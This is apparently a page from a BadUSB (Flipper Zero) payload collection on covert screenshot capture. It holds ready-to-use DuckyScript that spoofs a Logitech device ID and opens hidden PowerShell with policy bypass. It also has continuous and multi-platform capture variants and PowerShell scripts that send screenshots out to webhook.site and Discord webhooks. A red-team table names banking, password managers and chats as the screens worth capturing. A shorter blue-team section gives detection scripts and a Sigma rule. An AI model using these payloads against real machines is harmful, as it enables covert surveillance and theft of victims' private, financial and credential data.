# FZ-A07: Screenshot Capture

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A07 |
| **Name** | Screenshot Capture |
| **Difficulty** | Advanced |
| **Target OS** | Multi-Platform |
| **Output** | Image file(s) |
| **MITRE ATT&CK** | T1113 (Screen Capture) |

## What This Payload Does

Captures screenshots of the target's desktop and optionally exfiltrates them. Can be configured for single capture or continuous monitoring.

---

## The Payload

```ducky
REM =============================================
REM ADVANCED: Screenshot Capture
REM Target: Windows 10/11
REM Action: Captures screen to file
REM Output: %TEMP%\screenshot.png
REM Skill: Advanced
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Capture screenshot
STRINGLN Add-Type -AssemblyName System.Windows.Forms
STRINGLN Add-Type -AssemblyName System.Drawing
STRINGLN $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
STRINGLN $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
STRINGLN $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
STRINGLN $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
STRINGLN $bitmap.Save("$env:TEMP\screenshot.png")
STRINGLN $graphics.Dispose()
STRINGLN $bitmap.Dispose()
STRINGLN exit
```

---

## Screenshot Techniques

### Method 1: .NET Graphics (Above)

Standard method using System.Drawing to capture screen.

### Method 2: Multiple Monitors

```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screens = [System.Windows.Forms.Screen]::AllScreens
$counter = 0

foreach ($screen in $screens) {
    $bounds = $screen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save("$env:TEMP\screen_$counter.png")
    $graphics.Dispose()
    $bitmap.Dispose()
    $counter++
}
```

### Method 3: Continuous Capture

```powershell
# Capture every 30 seconds for 10 minutes
$endTime = (Get-Date).AddMinutes(10)
$counter = 0

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ((Get-Date) -lt $endTime) {
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $bitmap.Save("$env:TEMP\screen_$timestamp.png")
    $graphics.Dispose()
    $bitmap.Dispose()
    $counter++
    Start-Sleep -Seconds 30
}
```

### Method 4: Active Window Only

```powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
public class ScreenCapture {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int Left, Top, Right, Bottom;
    }
}
"@

$hwnd = [ScreenCapture]::GetForegroundWindow()
$rect = New-Object ScreenCapture+RECT
[ScreenCapture]::GetWindowRect($hwnd, [ref]$rect)
$width = $rect.Right - $rect.Left
$height = $rect.Bottom - $rect.Top

$bitmap = New-Object System.Drawing.Bitmap($width, $height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($rect.Left, $rect.Top, 0, 0, New-Object System.Drawing.Size($width, $height))
$bitmap.Save("$env:TEMP\activewindow.png")
```

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM Take screenshot using screencapture
STRINGLN screencapture -x /tmp/screenshot.png

REM Delayed screenshot (3 seconds)
STRINGLN screencapture -T 3 -x /tmp/screenshot_delayed.png

REM Screen recording (5 seconds)
STRINGLN screencapture -V 5 /tmp/screen_recording.mov
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Using scrot (may need to install)
STRINGLN scrot /tmp/screenshot.png 2>/dev/null

REM Using import (ImageMagick)
STRINGLN import -window root /tmp/screenshot.png 2>/dev/null

REM Using gnome-screenshot
STRINGLN gnome-screenshot -f /tmp/screenshot.png 2>/dev/null

REM Using xwd + convert
STRINGLN xwd -root | convert xwd:- /tmp/screenshot.png 2>/dev/null
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
REM Screenshot requires root or screen capture permission
STRINGLN su -c "screencap -p /sdcard/screenshot.png" 2>/dev/null

REM Alternative: Use ADB if debugging enabled
STRINGLN echo "Screenshot saved to /sdcard/screenshot.png"
```

### iOS

iOS screenshots via keyboard:
```ducky
DELAY 3000
REM Command+Shift+3 for screenshot (if external keyboard connected)
GUI SHIFT 3
DELAY 1000
REM Screenshot saved to Photos app
```

**Note**: Cannot exfiltrate iOS screenshots via BadUSB.

---

## Screenshot with Exfiltration

### Upload to Webhook

```powershell
# Capture and upload
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$tempPath = "$env:TEMP\screen.png"
$bitmap.Save($tempPath)

# Convert to base64 and upload
$bytes = [System.IO.File]::ReadAllBytes($tempPath)
$base64 = [Convert]::ToBase64String($bytes)

# Send to webhook
$body = @{
    hostname = $env:COMPUTERNAME
    image = $base64
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://webhook.site/YOUR_ID" -Method POST -Body $body -ContentType "application/json"

# Cleanup
Remove-Item $tempPath
```

### Discord Upload

```powershell
# Upload screenshot to Discord webhook
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
$file = "$env:TEMP\screen.png"

# Capture screen first (use methods above)

# Upload as file
$fileBytes = [System.IO.File]::ReadAllBytes($file)
$fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"",
    "Content-Type: image/png$LF",
    $fileEnc,
    "--$boundary--$LF"
) -join $LF

Invoke-RestMethod -Uri $webhook -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
```

---

## Red Team Perspective

### Screenshot Value

| Content | Intelligence Value |
|---------|-------------------|
| Open documents | Data theft |
| Email content | Communications |
| Chat windows | Personal info |
| Banking | Financial data |
| Password managers | Credential access |
| Development | Source code |

### Timing Considerations

| Trigger | Use Case |
|---------|----------|
| Immediate | Current activity |
| On window change | Diverse content |
| On keyword (title) | Sensitive content |
| Periodic | Activity monitoring |

### Attack Chain

```
Payload Deploy → Screenshot Capture → Exfiltration → Analysis
                        ↑
                    You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Graphics API Usage**
   - CopyFromScreen calls
   - Screen capture DLL usage

2. **File Creation**
   - Image files in temp directories
   - Unusual naming patterns

3. **Network Activity**
   - Large base64 uploads
   - Image file transfers

### Detection Script

```powershell
# Find recently created image files
Get-ChildItem $env:TEMP -Recurse -Include *.png,*.jpg,*.bmp -ErrorAction SilentlyContinue |
    Where-Object { $_.CreationTime -gt (Get-Date).AddHours(-1) }

# Check PowerShell logs for screen capture
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 200 | Where-Object {
    $_.Message -match 'CopyFromScreen|Screenshot|Screen.*Capture|System.Drawing'
}
```

### Sigma Rule

```yaml
title: Screen Capture via PowerShell
status: experimental
description: Detects screen capture attempts using PowerShell
logsource:
    product: windows
    category: ps_script
detection:
    selection:
        ScriptBlockText|contains:
            - 'CopyFromScreen'
            - 'System.Drawing.Bitmap'
            - 'PrimaryScreen.Bounds'
            - 'screencapture'
    condition: selection
level: medium
tags:
    - attack.collection
    - attack.t1113
```

### Prevention

1. **Endpoint Security**
   - Monitor for screen capture APIs
   - Block unauthorized capture tools

2. **DLP**
   - Detect image exfiltration
   - Block clipboard containing screenshots

3. **Physical Security**
   - Privacy screens
   - Clean desk policy

---

## Practice Exercises

### Exercise 1: Basic Screenshot
```powershell
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$b=New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($b).CopyFromScreen(0,0,0,0,$b.Size)
$b.Save("$env:USERPROFILE\Desktop\test.png")
```

### Exercise 2: Count Monitors
```powershell
[System.Windows.Forms.Screen]::AllScreens.Count
```

### Exercise 3: Get Screen Resolution
```powershell
[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
```

---

## Payload File

Save as `FZ-A07_Screenshot_Capture.txt`:

```ducky
REM FZ-A07: Screenshot Capture
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
STRINGLN Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object Drawing.Bitmap($s.Width,$s.Height);$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size);$b.Save("$env:TEMP\s.png");$g.Dispose();$b.Dispose()
```

---

[← FZ-A06 Keylogger](FZ-A06_Keylogger.md) | [Back to Advanced](README.md) | [Next: FZ-A08 AD Enumeration →](FZ-A08_AD_Enumeration.md)
